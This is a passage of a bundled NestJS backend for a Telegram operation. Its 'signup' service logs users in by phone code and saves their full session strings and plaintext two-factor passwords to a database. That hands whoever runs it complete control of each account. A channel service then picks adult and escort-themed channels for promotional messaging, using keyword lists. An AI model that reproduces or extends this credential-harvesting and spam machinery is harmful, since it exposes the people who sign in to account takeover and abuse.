    (0, swagger_1.ApiTags)('tgsignup'),
    (0, swagger_1.ApiExtraModels)(tg_signup_dto_1.SendCodeDto, tg_signup_dto_1.VerifyCodeDto, tg_signup_dto_1.TgSignupResponse),
    __metadata("design:paramtypes", [tg_signup_service_1.TgSignupService])
], TgSignupController);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.module.ts":
/*!*****************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.module.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const tg_signup_controller_1 = __webpack_require__(/*! ./tg-signup.controller */ "./src/components/TgSignup/tg-signup.controller.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const tg_signup_service_1 = __webpack_require__(/*! ./tg-signup.service */ "./src/components/TgSignup/tg-signup.service.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TgSignupModule = class TgSignupModule {
};
exports.TgSignupModule = TgSignupModule;
exports.TgSignupModule = TgSignupModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            (0, common_1.forwardRef)(() => users_module_1.UsersModule)
        ],
        controllers: [tg_signup_controller_1.TgSignupController],
        providers: [tg_signup_service_1.TgSignupService],
        exports: [tg_signup_service_1.TgSignupService]
    })
], TgSignupModule);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.service.ts":
/*!******************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.service.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var TgSignupService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const Password_1 = __webpack_require__(/*! telegram/Password */ "telegram/Password");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const tg_apps_1 = __webpack_require__(/*! ../../utils/tg-apps */ "./src/utils/tg-apps.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let TgSignupService = TgSignupService_1 = class TgSignupService {
    constructor(usersService) {
        this.usersService = usersService;
        this.logger = new utils_1.Logger(TgSignupService_1.name);
        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService_1.SESSION_CLEANUP_INTERVAL);
    }
    async onModuleDestroy() {
        clearInterval(this.cleanupInterval);
        const phones = Array.from(TgSignupService_1.activeClients.keys());
        await Promise.all(phones.map(phone => this.disconnectClient(phone)));
    }
    async cleanupStaleSessions() {
        for (const [phone, session] of TgSignupService_1.activeClients) {
            try {
                if (Date.now() - session.createdAt > TgSignupService_1.LOGIN_TIMEOUT &&
                    (!session.client || !session.client.connected)) {
                    await this.disconnectClient(phone);
                }
            }
            catch (error) {
                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);
            }
        }
    }
    validatePhoneNumber(phone) {
        phone = phone.replace(/^\+/, '');
        if (!/^\d{8,15}$/.test(phone)) {
            throw new common_1.BadRequestException('Please enter a valid phone number');
        }
        return phone;
    }
    async disconnectClient(phone) {
        const session = TgSignupService_1.activeClients.get(phone);
        if (session) {
            try {
                clearTimeout(session.timeoutId);
                await session.client.destroy();
                this.logger.log(`Client disconnected for ${phone}`);
            }
            catch (error) {
                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);
            }
            finally {
                TgSignupService_1.activeClients.delete(phone);
            }
        }
    }
    async sendCode(phone) {
        try {
            phone = this.validatePhoneNumber(phone);
            const existingSession = TgSignupService_1.activeClients.get(phone);
            if (existingSession && existingSession.client?.connected) {
                await this.disconnectClient(phone);
            }
            const { apiId, apiHash } = await (0, tg_apps_1.getCredentialsForMobile)(phone, 600);
            const session = new sessions_1.StringSession('');
            const client = new telegram_1.TelegramClient(session, apiId, apiHash, {
                connectionRetries: 5,
                retryDelay: 2000,
                useWSS: false,
                useIPV6: false,
                timeout: 30000
            });
            await client.setLogLevel(Logger_1.LogLevel.ERROR);
            await client.connect();
            const sendResult = await client.invoke(new tl_1.Api.auth.SendCode({
                phoneNumber: phone,
                apiId,
                apiHash,
                settings: new tl_1.Api.CodeSettings({
                    currentNumber: true,
                    allowAppHash: true,
                }),
            }));
            if (sendResult instanceof tl_1.Api.auth.SentCodeSuccess) {
                this.logger.error(`Unexpected immediate login for ${phone}`);
                throw new common_1.BadRequestException('Unexpected immediate login');
            }
            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService_1.LOGIN_TIMEOUT);
            TgSignupService_1.activeClients.set(phone, {
                client,
                phoneCodeHash: sendResult.phoneCodeHash,
                timeoutId,
                createdAt: Date.now()
            });
            return {
                phoneCodeHash: sendResult.phoneCodeHash,
                isCodeViaApp: sendResult.type instanceof tl_1.Api.auth.SentCodeTypeApp,
            };
        }
        catch (error) {
            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);
            await this.disconnectClient(phone);
            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {
                throw new common_1.BadRequestException('This phone number has been banned from Telegram');
            }
            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {
                throw new common_1.BadRequestException('Please enter a valid phone number');
            }
            if (error.errorMessage?.includes('FLOOD_WAIT')) {
                throw new common_1.BadRequestException('Please wait a few minutes before trying again');
            }
            throw new common_1.BadRequestException('Unable to send OTP. Please try again');
        }
    }
    async verifyCode(phone, code, password) {
        try {
            phone = this.validatePhoneNumber(phone);
            const session = TgSignupService_1.activeClients.get(phone);
            if (!session) {
                this.logger.warn(`No active signup session found for ${phone}`);
                throw new common_1.BadRequestException('Session Expired. Please start again');
            }
            clearTimeout(session.timeoutId);
            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService_1.LOGIN_TIMEOUT);
            if (!session.client?.connected) {
                try {
                    await session.client?.connect();
                }
                catch (error) {
                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);
                    try {
                        const { apiId, apiHash } = await (0, tg_apps_1.getCredentialsForMobile)(phone, 600);
                        const newSession = new sessions_1.StringSession('');
                        const newClient = new telegram_1.TelegramClient(newSession, apiId, apiHash, {
                            connectionRetries: 5,
                            retryDelay: 2000,
                            useWSS: false,
                            timeout: 30000
                        });
                        await newClient.connect();
                        session.client = newClient;
                    }
                    catch (reconnectError) {
                        throw new common_1.BadRequestException('Connection failed. Please try verifying again.');
                    }
                }
            }
            const { client, phoneCodeHash } = session;
            try {
                this.logger.debug(`Attempting to sign in with code for ${phone}`);
                const signInResult = await client.invoke(new tl_1.Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash,
                    phoneCode: code,
                }));
                if (!signInResult) {
                    throw new common_1.BadRequestException('Invalid response from Telegram server');
                }
                if (signInResult instanceof tl_1.Api.auth.AuthorizationSignUpRequired) {
                    this.logger.log(`New user registration required for ${phone}`);
                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);
                    await this.disconnectClient(phone);
                    return result;
                }
                const sessionString = client.session.save();
                if (!sessionString) {
                    throw new Error('Failed to generate session string');
                }
                const userData = await this.processLoginResult(signInResult.user, sessionString, password);
                await this.disconnectClient(phone);
                return userData;
            }
            catch (error) {
                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                    this.logger.warn(`2FA required for ${phone}`);
                    if (!password) {
                        return {
                            status: 400,
                            message: 'Two-factor authentication required',
                            requires2FA: true
                        };
                    }
                    return await this.handle2FALogin(phone, session.client, password);
                }
                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||
                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {
                    throw new common_1.BadRequestException('Invalid OTP,  Try again!');
                }
                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);
                throw new common_1.BadRequestException('Verification failed. Please try again.');
            }
        }
        catch (error) {
            this.logger.error(`Verification error for ${phone}: ${error.message}`);
            if (error.message?.includes('No active signup session') ||
                error.message?.includes('Connection failed')) {
                await this.disconnectClient(phone);
            }
            throw error instanceof common_1.BadRequestException ? error :
                new common_1.BadRequestException(error.message || 'Verification failed, please try again');
        }
    }
    async handle2FALogin(phone, client, password) {
        try {
            this.logger.debug(`Fetching password SRP parameters for ${phone}`);
            const passwordSrpResult = await client.invoke(new tl_1.Api.account.GetPassword());
            this.logger.debug(`Computing password check for ${phone}`);
            const passwordCheck = await (0, Password_1.computeCheck)(passwordSrpResult, password);
            this.logger.debug(`Invoking CheckPassword API for ${phone}`);
            const signInResult = await client.invoke(new tl_1.Api.auth.CheckPassword({
                password: passwordCheck,
            }));
            if (!signInResult || !signInResult.user) {
                throw new common_1.BadRequestException('Invalid response from Telegram server');
            }
            this.logger.log(`2FA login successful for ${phone}`);
            const sessionString = client.session.save();
            if (!sessionString) {
                throw new Error('Failed to generate session string');
            }
            const userData = await this.processLoginResult(signInResult.user, sessionString, password);
            await this.disconnectClient(phone);
            return userData;
        }
        catch (error) {
            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);
            if (password) {
                throw new common_1.BadRequestException('Incorrect 2FA password');
            }
            throw new common_1.BadRequestException('2FA password required');
        }
    }
    async handleNewUserRegistration(phone, client, phoneCodeHash) {
        try {
            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;
            const signUpResult = await client.invoke(new tl_1.Api.auth.SignUp({
                phoneNumber: phone,
                phoneCodeHash,
                firstName: randomName,
                lastName: '',
            }));
            if (!signUpResult || !signUpResult.user) {
                throw new common_1.BadRequestException('Invalid response from Telegram server');
            }
            const sessionString = client.session.save();
            if (!sessionString) {
                throw new Error('Failed to generate session string');
            }
            return await this.processLoginResult(signUpResult.user, sessionString);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, "TGSIGNUP", false);
            this.logger.error(`Failed to register new user: ${errorDetails.message}`);
            throw new common_1.BadRequestException(errorDetails.message || 'Failed to register new user');
        }
    }
    async processLoginResult(user, sessionString, password) {
        try {
            if (!user || !sessionString) {
                throw new Error('Invalid user data or session string');
            }
            const now = new Date();
            const userData = {
                mobile: user.phone?.toString()?.replace(/^\+/, '') || '',
                session: sessionString,
                firstName: user.firstName || '',
                lastName: user.lastName || '',
                username: user.username || '',
                tgId: user.id?.toString() || '',
                twoFA: !!password,
                password: password || null,
                lastActive: now.toISOString().split('T')[0],
                expired: false,
                channels: 0,
                personalChats: 0,
                totalChats: 0,
                otherPhotoCount: 0,
                ownPhotoCount: 0,
                ownVideoCount: 0,
                otherVideoCount: 0,
                recentUsers: [],
                calls: {
                    chatCallCounts: [],
                    incoming: 0,
                    outgoing: 0,
                    totalCalls: 0,
                    video: 0,
                },
                contacts: 0,
                movieCount: 0,
                msgs: 0,
                photoCount: 0,
                videoCount: 0,
                gender: 'unknown',
            };
            if (!userData.mobile || !userData.tgId) {
                throw new Error('Invalid user data received from Telegram');
            }
            await this.usersService.create(userData);
            return {
                status: 200,
                message: 'Registration successful',
                session: sessionString,
            };
        }
        catch (error) {
            this.logger.error('Error processing login result:', error);
            if (error instanceof common_1.BadRequestException) {
                throw error;
            }
            throw new common_1.InternalServerErrorException('Failed to complete registration');
        }
    }
};
exports.TgSignupService = TgSignupService;
TgSignupService.LOGIN_TIMEOUT = 300000;
TgSignupService.SESSION_CLEANUP_INTERVAL = 300000;
TgSignupService.PHONE_PREFIX = "+";
TgSignupService.activeClients = new Map();
exports.TgSignupService = TgSignupService = TgSignupService_1 = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [users_service_1.UsersService])
], TgSignupService);


/***/ }),

/***/ "./src/components/active-channels/active-channels.controller.ts":
/*!**********************************************************************!*\
  !*** ./src/components/active-channels/active-channels.controller.ts ***!
  \**********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const create_active_channel_dto_1 = __webpack_require__(/*! ./dto/create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts");
const update_active_channel_dto_1 = __webpack_require__(/*! ./dto/update-active-channel.dto */ "./src/components/active-channels/dto/update-active-channel.dto.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let ActiveChannelsController = class ActiveChannelsController {
    constructor(activeChannelsService) {
        this.activeChannelsService = activeChannelsService;
    }
    async create(createActiveChannelDto) {
        return this.activeChannelsService.create(createActiveChannelDto);
    }
    async createMultiple(createChannelDtos) {
        return this.activeChannelsService.createMultiple(createChannelDtos);
    }
    search(query) {
        return this.activeChannelsService.search(query);
    }
    async findAll() {
        return this.activeChannelsService.findAll();
    }
    async findOne(channelId) {
        return this.activeChannelsService.findOne(channelId);
    }
    async update(channelId, updateActiveChannelDto) {
        return this.activeChannelsService.update(channelId, updateActiveChannelDto);
    }
    async remove(channelId) {
        return this.activeChannelsService.remove(channelId);
    }
};
exports.ActiveChannelsController = ActiveChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new active channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_active_channel_dto_1.CreateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('createMultiple'),
    (0, swagger_1.ApiOperation)({ summary: 'Create multiple channels' }),
    (0, swagger_1.ApiBody)({ type: [create_active_channel_dto_1.CreateActiveChannelDto] }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "createMultiple", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    (0, swagger_1.ApiQuery)({ name: 'channelId', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'broadcast', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'canSendMsgs', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'participantsCount', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'restricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'sendMessages', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'title', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'wordRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'dMRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'availableMsgs', required: false, type: [String] }),
    (0, swagger_1.ApiQuery)({ name: 'banned', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'reactRestricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'megagroup', required: false, type: Boolean }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all active channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_active_channel_dto_1.UpdateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "remove", null);
exports.ActiveChannelsController = ActiveChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Active Channels'),
    (0, common_1.Controller)('active-channels'),
    __metadata("design:paramtypes", [active_channels_service_1.ActiveChannelsService])
], ActiveChannelsController);


/***/ }),

/***/ "./src/components/active-channels/active-channels.module.ts":
/*!******************************************************************!*\
  !*** ./src/components/active-channels/active-channels.module.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const active_channels_controller_1 = __webpack_require__(/*! ./active-channels.controller */ "./src/components/active-channels/active-channels.controller.ts");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const promote_msgs_module_1 = __webpack_require__(/*! ../promote-msgs/promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts");
let ActiveChannelsModule = class ActiveChannelsModule {
};
exports.ActiveChannelsModule = ActiveChannelsModule;
exports.ActiveChannelsModule = ActiveChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: active_channel_schema_1.ActiveChannel.name, schema: active_channel_schema_1.ActiveChannelSchema }]),
            promote_msgs_module_1.PromoteMsgModule
        ],
        controllers: [active_channels_controller_1.ActiveChannelsController],
        providers: [active_channels_service_1.ActiveChannelsService],
        exports: [active_channels_service_1.ActiveChannelsService]
    })
], ActiveChannelsModule);


/***/ }),

/***/ "./src/components/active-channels/active-channels.service.ts":
/*!*******************************************************************!*\
  !*** ./src/components/active-channels/active-channels.service.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsService = void 0;
const promote_msgs_service_1 = __webpack_require__(/*! ./../promote-msgs/promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
let ActiveChannelsService = class ActiveChannelsService {
    constructor(activeChannelModel, promoteMsgsService) {
        this.activeChannelModel = activeChannelModel;
        this.promoteMsgsService = promoteMsgsService;
        this.DEFAULT_LIMIT = 50;
        this.DEFAULT_SKIP = 0;
        this.MIN_PARTICIPANTS_COUNT = 600;
    }
    async create(createActiveChannelDto) {
        try {
            if (!createActiveChannelDto.channelId) {
                throw new common_1.BadRequestException('Channel ID is required');
            }
            const availableMsgs = await this.getAvailableMessages();
            const createdChannel = new this.activeChannelModel({
                ...createActiveChannelDto,
                availableMsgs,
                createdAt: new Date(),
            });
            return await createdChannel.save();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to create channel');
        }
    }
    async createMultiple(createChannelDtos) {
        try {
            if (!createChannelDtos?.length) {
                throw new common_1.BadRequestException('At least one channel DTO is required');
            }
            const bulkOps = createChannelDtos.map((dto) => {
                if (!dto.channelId) {
                    throw new common_1.BadRequestException('Channel ID is required for all DTOs');
                }
                const cleanDto = Object.fromEntries(Object.entries(dto).filter(([_, value]) => value !== undefined && value !== null));
                return {
                    updateOne: {
                        filter: { channelId: dto.channelId },
                        update: {
                            $set: {
                                title: { $ifNull: [dto.title, '$title'] },
                                username: { $ifNull: [dto.username, '$username'] },
                                participantsCount: { $ifNull: [dto.participantsCount, '$participantsCount'] },
                                updatedAt: new Date(),
                            },
                            $setOnInsert: {
                                channelId: dto.channelId,
                                broadcast: false,
                                canSendMsgs: true,
                                participantsCount: cleanDto.participantsCount ?? 0,
                                restricted: false,
                                sendMessages: true,
                                reactRestricted: false,
                                wordRestriction: 0,
                                dMRestriction: 0,
                                availableMsgs: [],
                                banned: false,
                                megagroup: cleanDto.megagroup ?? true,
                                private: false,
                                createdAt: new Date(),
                            },
                        },
                        upsert: true,
                    },
                };
            });
            await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });
            return `Successfully processed ${createChannelDtos.length} channels`;
        }
        catch (error) {
            throw this.handleError(error, 'Failed to create multiple channels');
        }
    }
    async findAll() {
        try {
            return await this.activeChannelModel.find().lean().exec();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to fetch all channels');
        }
    }
    async findOne(channelId) {
        try {
            if (!channelId) {
                throw new common_1.BadRequestException('Channel ID is required');
            }
            return await this.activeChannelModel.findOne({ channelId }).lean().exec();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to fetch channel');
        }
    }
    async update(channelId, updateActiveChannelDto) {
        try {
            delete updateActiveChannelDto["_id"];
            if (!channelId) {
                throw new common_1.BadRequestException('Channel ID is required');
            }
            const cleanDto = Object.fromEntries(Object.entries(updateActiveChannelDto).filter(([_, value]) => value !== undefined));
            if (Object.keys(cleanDto).length === 0) {
                throw new common_1.BadRequestException('At least one field to update is required');
            }
            const updatedChannel = await this.activeChannelModel
                .findOneAndUpdate({ channelId }, { $set: { ...cleanDto, updatedAt: new Date() } }, { new: true, upsert: true, lean: true })
                .exec();
            return updatedChannel;
        }
        catch (error) {
            throw this.handleError(error, 'Failed to update channel');
        }
    }
    async removeFromAvailableMsgs(channelId, msg) {
        try {
            if (!channelId || !msg) {
                throw new common_1.BadRequestException('Channel ID and message are required');
            }
            return await this.activeChannelModel
                .findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg }, $set: { updatedAt: new Date() } }, { new: true, lean: true })
                .exec();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to remove message from available messages');
        }
    }
    async addToAvailableMsgs(channelId, msg) {
        try {
            if (!channelId || !msg) {
                throw new common_1.BadRequestException('Channel ID and message are required');
            }
            return await this.activeChannelModel
                .findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg }, $set: { updatedAt: new Date() } }, { new: true, lean: true })
                .exec();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to add message to available messages');
        }
    }
    async remove(channelId) {
        try {
            if (!channelId) {
                throw new common_1.BadRequestException('Channel ID is required');
            }
            const botsService = (0, utils_1.getBotsServiceInstance)();
            if (botsService) {
                await botsService.sendMessageByCategory(bots_1.ChannelCategory.PROM_LOGS2, `Removing Active Channel: ${channelId}`);
            }
            await this.activeChannelModel.findOneAndDelete({ channelId }).exec();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to remove channel');
        }
    }
    async search(filter) {
        try {
            if (!filter || Object.keys(filter).length === 0) {
                throw new common_1.BadRequestException('Search filter is required');
            }
            return await this.activeChannelModel.find(filter).lean().exec();
        }
        catch (error) {
            throw this.handleError(error, 'Failed to search channels');
        }
    }
    async getActiveChannels(limit = this.DEFAULT_LIMIT, skip = this.DEFAULT_SKIP, notIds = []) {
        try {
            const positiveKeywords = [
                'wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl',
                'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video',
                'service', 'real', 'call', 'desi', 'partner', 'hook', 'romance', 'flirt', 'single', 'chat',
                'meet', 'intimate', 'escort', 'night', 'fun', 'hot', 'sexy', 'lovers', 'connect', 'relationship'
            ];
            const negativeKeywords = [
                'online', 'realestat', 'propert', 'freefire', 'bgmi', 'promo', 'agent', 'board', 'design',
                'realt', 'clas', 'PROFIT', 'wholesale', 'retail', 'topper', 'exam', 'motivat', 'medico',
                'shop', 'follower', 'insta', 'traini', 'cms', 'cma', 'subject', 'currency', 'color', 'amity',
                'game', 'gamin', 'like', 'earn', 'popcorn', 'TANISHUV', 'bitcoin', 'crypto', 'mall', 'work',
                'folio', 'health', 'civil', 'win', 'casino', 'promot', 'english', 'invest', 'fix', 'money',
                'book', 'anim', 'angime', 'support', 'cinema', 'bet', 'predic', 'study', 'youtube', 'sub',
                'open', 'trad', 'cric', 'quot', 'exch', 'movie', 'search', 'film', 'offer', 'ott', 'deal',
                'quiz', 'academ', 'insti', 'talkies', 'screen', 'series', 'webser', 'business', 'market',
                'trade', 'news', 'tech', 'education', 'learn', 'course', 'job', 'career', 'finance', 'stock',
                'shopify', 'ecommerce', 'advert', 'marketing', 'blog', 'vlog', 'tutorial', 'fitness', 'gym',
                'diet', 'travel', 'tour', 'hotel', 'food', 'recipe', 'fashion', 'style', 'beauty', 'music',
                'art', 'craft', 'event', 'party', 'ticket'
            ];
            const query = {
                $and: [
                    {
                        $or: [
